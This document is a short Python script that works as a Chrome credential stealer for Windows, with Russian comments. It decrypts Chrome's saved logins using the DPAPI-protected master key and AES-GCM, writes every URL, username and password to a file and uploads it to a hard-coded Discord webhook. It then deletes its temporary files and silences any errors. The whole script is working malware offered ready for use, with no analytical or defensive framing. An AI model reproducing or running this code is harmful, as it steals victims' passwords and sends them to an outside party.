import os, json, base64, sqlite3, shutil, requests
from Crypto.Cipher import AES
import win32crypt

# Твой вебхук уже вшит
W_H = "https://discord.com/api/webhooks/1479851804668854322/xaXX3_k4W8mFLtuSbZo0MpjwiiUCb3VJB7MMYNiBZDjZCUE4knseAknpTgS85Q9Ck2Wj"

def g_m_k():
    l_s = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(l_s, "r", encoding="utf-8") as f:
        m_k = json.loads(f.read())["os_crypt"]["encrypted_key"]
    m_k = base64.b64decode(m_k)[5:]
    return win32crypt.CryptUnprotectData(m_k, None, None, None, 0)[1]

def d_p(b, k):
    try:
        iv, p = b[3:15], b[15:]
        c = AES.new(k, AES.MODE_GCM, iv)
        return c.decrypt(p)[:-16].decode()
    except: return "Error"

def start():
    key = g_m_k()
    db_p = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    tmp_db = "sys_cache.db"
    shutil.copy2(db_p, tmp_db)
    
    conn = sqlite3.connect(tmp_db)
    cur = conn.cursor()
    cur.execute("SELECT action_url, username_value, password_value FROM logins")
    
    data = ""
    for r in cur.fetchall():
        p = d_p(r[2], key)
        if r[1]: data += f"URL: {r[0]}\nU: {r[1]}\nP: {p}\n\n"
    
    with open("logs.txt", "w", encoding="utf-8") as f: f.write(data)
    
    # Отправка
    requests.post(W_H, files={"file": open("logs.txt", "rb")})
    
    # Чистка
    conn.close()
    os.remove(tmp_db)
    os.remove("logs.txt")

if __name__ == "__main__":
    try: start()
    except: pass
